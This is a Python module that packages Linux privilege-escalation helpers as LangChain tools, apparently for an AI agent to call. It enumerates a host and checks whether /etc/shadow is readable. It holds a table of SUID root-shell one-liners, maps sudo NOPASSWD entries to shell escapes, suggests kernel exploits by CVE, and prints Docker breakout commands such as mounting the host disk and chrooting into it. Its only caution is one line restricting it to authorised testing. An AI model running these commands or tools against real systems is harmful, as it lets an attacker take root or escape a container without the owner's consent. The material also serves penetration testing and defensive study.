"""
PrivEsc Tools - Privilege Escalation Helpers
Linux/Windows privilege escalation enumeration and suggestions.

Tools:
- linux_enum: Automated Linux enumeration
- suid_finder: Find SUID/SGID binaries
- writable_paths: Find world-writable directories
- cron_enum: Enumerate cron jobs
- sudo_parse: Parse sudo -l output
- kernel_exploits: Suggest kernel exploits
- docker_escape: Docker breakout vectors
- capabilities_check: Linux capabilities enumeration

WARNING: For authorized security testing only.
"""

import os
import re
import subprocess
import platform
from typing import Optional, List, Dict
from langchain_core.tools import tool


# GTFOBins SUID exploits database (partial)
GTFOBINS_SUID = {
    "bash": "bash -p",
    "cp": "cp /etc/passwd /tmp/passwd.bak; edit /etc/passwd",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "nmap": "nmap --interactive; !sh",
    "vim": "vim -c ':!/bin/sh'",
    "less": "less /etc/passwd; !/bin/sh",
    "more": "more /etc/passwd; !/bin/sh",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "ruby": "ruby -e 'exec \"/bin/sh\"'",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip": "zip /tmp/x.zip /tmp/x -T -TT '/bin/sh #'",
    "gcc": "gcc -wrapper /bin/sh,-s .",
    "env": "env /bin/sh -p",
    "time": "/usr/bin/time /bin/sh -p",
}

# Kernel exploit database
KERNEL_EXPLOITS = {
    "2.6": ["CVE-2010-3904 (RDS)", "CVE-2010-4258 (Full-Nelson)"],
    "3.": ["CVE-2016-5195 (Dirty COW)", "CVE-2014-3153 (Futex)"],
    "4.": ["CVE-2017-16995 (eBPF)", "CVE-2019-13272 (PTRACE)"],
    "5.": ["CVE-2021-3156 (Baron Samedit)", "CVE-2022-0847 (Dirty Pipe)"],
}


def _run_cmd(cmd: str, timeout: int = 30) -> str:
    """Run command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip() or result.stderr.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {e}"


@tool
def linux_enum() -> str:
    """
    Automated Linux enumeration for privilege escalation.

    Returns:
        Comprehensive enumeration results
    """
    if platform.system() != "Linux":
        return "This tool only works on Linux systems"

    results = ["Linux Privilege Escalation Enumeration", "=" * 50]

    # Basic info
    results.append("\n[System Info]")
    results.append(f"Hostname: {_run_cmd('hostname')}")
    results.append(f"Kernel: {_run_cmd('uname -a')}")
    results.append(f"Distro: {_run_cmd('cat /etc/*-release 2>/dev/null | head -3')}")

    # Current user
    results.append("\n[Current User]")
    results.append(f"User: {_run_cmd('id')}")
    results.append(f"Groups: {_run_cmd('groups')}")

    # Interesting files
    results.append("\n[Interesting Files]")
    for f in ["/etc/passwd", "/etc/shadow", "/etc/sudoers"]:
        perm = _run_cmd(f"ls -la {f} 2>/dev/null")
        readable = "READABLE" if os.access(f, os.R_OK) else "not readable"
        results.append(f"{f}: {readable}")

    # Network
    results.append("\n[Network]")
    results.append(_run_cmd("ip addr 2>/dev/null || ifconfig 2>/dev/null | head -10"))

    # Running processes
    results.append("\n[Interesting Processes]")
    procs = _run_cmd("ps aux | grep -E 'root|mysql|postgres' | head -10")
    results.append(procs)

    return "\n".join(results)


@tool
def suid_finder() -> str:
    """
    Find SUID/SGID binaries and suggest exploits.

    Returns:
        List of SUID binaries with GTFOBins suggestions
    """
    if platform.system() != "Linux":
        return "This tool only works on Linux systems"

    results = ["SUID/SGID Binary Finder", "=" * 50]

    # Find SUID binaries
    suid_output = _run_cmd("find / -perm -4000 -type f 2>/dev/null")
    suid_bins = suid_output.split("\n") if suid_output else []

    results.append(f"\n[SUID Binaries Found: {len(suid_bins)}]")

    exploitable = []
    for binary in suid_bins[:30]:  # Limit output
        if not binary:
            continue
        name = os.path.basename(binary)
        results.append(f"  {binary}")

        if name in GTFOBINS_SUID:
            exploitable.append((binary, GTFOBINS_SUID[name]))
            results.append(f"    [!] GTFOBins exploit available!")

    if exploitable:
        results.append("\n[Exploitable SUID Binaries]")
        for binary, exploit in exploitable:
            results.append(f"\n{binary}:")
            results.append(f"  Exploit: {exploit}")

    # Find SGID binaries
    sgid_output = _run_cmd("find / -perm -2000 -type f 2>/dev/null | head -20")
    if sgid_output:
        results.append(f"\n[SGID Binaries (first 20)]")
        results.append(sgid_output)

    return "\n".join(results)


@tool
def writable_paths() -> str:
    """
    Find world-writable directories and files.

    Returns:
        List of writable paths that could be exploited
    """
    if platform.system() != "Linux":
        return "This tool only works on Linux systems"

    results = ["World-Writable Path Finder", "=" * 50]

    # World-writable directories
    results.append("\n[World-Writable Directories]")
    dirs = _run_cmd("find / -type d -perm -0002 2>/dev/null | head -30")
    results.append(dirs if dirs else "None found")

    # Writable files in sensitive locations
    results.append("\n[Writable Files in /etc]")
    etc_files = _run_cmd("find /etc -writable 2>/dev/null | head -20")
    results.append(etc_files if etc_files else "None found")

    # Writable in PATH directories
    results.append("\n[Writable in PATH]")
    path_dirs = os.environ.get("PATH", "").split(":")
    for d in path_dirs:
        if os.access(d, os.W_OK):
            results.append(f"  [!] Writable: {d}")

    return "\n".join(results)


@tool
def cron_enum() -> str:
    """
    Enumerate cron jobs for privilege escalation.

    Returns:
        Cron job analysis with potential vulnerabilities
    """
    if platform.system() != "Linux":
        return "This tool only works on Linux systems"

    results = ["Cron Job Enumeration", "=" * 50]

    # System crontabs
    cron_files = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/var/spool/cron/crontabs/",
    ]

    for cf in cron_files:
        results.append(f"\n[{cf}]")
        if os.path.isdir(cf):
            files = _run_cmd(f"ls -la {cf} 2>/dev/null")
            results.append(files)
        else:
            content = _run_cmd(f"cat {cf} 2>/dev/null | head -20")
            results.append(content if content else "Not accessible")

    # Look for writable scripts in cron
    results.append("\n[Writable Cron Scripts]")
    cron_scripts = _run_cmd(
        "grep -rh '/' /etc/cron* 2>/dev/null | grep -E '^[^#]' | awk '{print $NF}' | sort -u"
    )
    for script in cron_scripts.split("\n"):
        if script and os.path.isfile(script) and os.access(script, os.W_OK):
            results.append(f"  [!] Writable: {script}")

    return "\n".join(results)


@tool
def sudo_parse(sudo_output: Optional[str] = None) -> str:
    """
    Parse sudo -l output and suggest exploits.

    Args:
        sudo_output: Output of 'sudo -l' command (optional, will run if not provided)

    Returns:
        Analysis of sudo permissions with exploit suggestions
    """
    results = ["Sudo Permissions Analysis", "=" * 50]

    if sudo_output is None:
        sudo_output = _run_cmd("sudo -l 2>/dev/null")

    if not sudo_output or "not allowed" in sudo_output.lower():
        return "No sudo permissions found or sudo not available"

    results.append("\n[Raw Output]")
    results.append(sudo_output)

    # Parse for exploitable entries
    results.append("\n[Exploit Suggestions]")

    exploit_patterns = {
        r"NOPASSWD.*\bvi\b": "vi: :!/bin/sh",
        r"NOPASSWD.*\bvim\b": "vim: :!/bin/sh",
        r"NOPASSWD.*\bnano\b": "nano: Ctrl+R, Ctrl+X, then command",
        r"NOPASSWD.*\bless\b": "less: !/bin/sh",
        r"NOPASSWD.*\bmore\b": "more: !/bin/sh",
        r"NOPASSWD.*\bfind\b": "find: find . -exec /bin/sh \\;",
        r"NOPASSWD.*\bawk\b": "awk: awk 'BEGIN {system(\"/bin/sh\")}'",
        r"NOPASSWD.*\bperl\b": "perl: perl -e 'exec \"/bin/sh\";'",
        r"NOPASSWD.*\bpython": "python: python -c 'import os; os.system(\"/bin/sh\")'",
        r"NOPASSWD.*\bruby\b": "ruby: ruby -e 'exec \"/bin/sh\"'",
        r"NOPASSWD.*\benv\b": "env: env /bin/sh",
        r"NOPASSWD.*ALL": "[!] Can run any command as root!",
    }

    found_exploits = []
    for pattern, exploit in exploit_patterns.items():
        if re.search(pattern, sudo_output, re.IGNORECASE):
            found_exploits.append(exploit)

    if found_exploits:
        for e in found_exploits:
            results.append(f"  {e}")
    else:
        results.append("  No obvious exploits found")

    return "\n".join(results)


@tool
def kernel_exploits(version: Optional[str] = None) -> str:
    """
    Suggest kernel exploits based on version.

    Args:
        version: Kernel version (optional, will detect if not provided)

    Returns:
        List of potential kernel exploits
    """
    results = ["Kernel Exploit Suggester", "=" * 50]

    if version is None:
        version = _run_cmd("uname -r")

    results.append(f"\nKernel Version: {version}")
    results.append("\n[Potential Exploits]")

    suggested = []
    for ver_prefix, exploits in KERNEL_EXPLOITS.items():
        if version.startswith(ver_prefix):
            suggested.extend(exploits)

    if suggested:
        for exploit in suggested:
            results.append(f"  - {exploit}")
    else:
        results.append("  No known exploits for this kernel version")

    results.append("\n[Search Resources]")
    results.append(f"  - searchsploit linux kernel {version[:3]}")
    results.append("  - https://github.com/lucyoa/kernel-exploits")

    return "\n".join(results)


@tool
def docker_escape() -> str:
    """
    Check for Docker container escape vectors.

    Returns:
        Docker breakout analysis and suggestions
    """
    results = ["Docker Escape Analysis", "=" * 50]

    # Check if in container
    in_docker = os.path.exists("/.dockerenv")
    in_container = _run_cmd("cat /proc/1/cgroup 2>/dev/null | grep -q docker && echo yes")

    if not (in_docker or "yes" in in_container):
        return "Not running inside a Docker container"

    results.append("\n[Container Detected]")

    # Check for privileged mode
    results.append("\n[Privileged Mode Check]")
    cap_eff = _run_cmd("cat /proc/self/status | grep CapEff")
    if "0000003fffffffff" in cap_eff:
        results.append("  [!] Running in PRIVILEGED mode!")
        results.append("  Escape: mount /dev/sda1 /mnt && chroot /mnt")

    # Check for mounted docker socket
    results.append("\n[Docker Socket]")
    if os.path.exists("/var/run/docker.sock"):
        results.append("  [!] Docker socket mounted!")
        results.append("  Escape: docker run -v /:/host -it alpine chroot /host")

    # Check capabilities
    results.append("\n[Capabilities]")
    caps = _run_cmd("capsh --print 2>/dev/null")
    dangerous_caps = ["cap_sys_admin", "cap_sys_ptrace", "cap_net_admin"]
    for cap in dangerous_caps:
        if cap in caps.lower():
            results.append(f"  [!] {cap} - potentially exploitable")

    return "\n".join(results)


# Export tools
TOOLS = [
    linux_enum,
    suid_finder,
    writable_paths,
    cron_enum,
    sudo_parse,
    kernel_exploits,
    docker_escape,
]

TOOL_DESCRIPTIONS = {
    "linux_enum": "Automated Linux privesc enumeration",
    "suid_finder": "Find SUID/SGID binaries with GTFOBins",
    "writable_paths": "Find world-writable directories",
    "cron_enum": "Enumerate cron jobs for privesc",
    "sudo_parse": "Parse sudo -l and suggest exploits",
    "kernel_exploits": "Suggest kernel exploits by version",
    "docker_escape": "Docker container escape vectors",
}
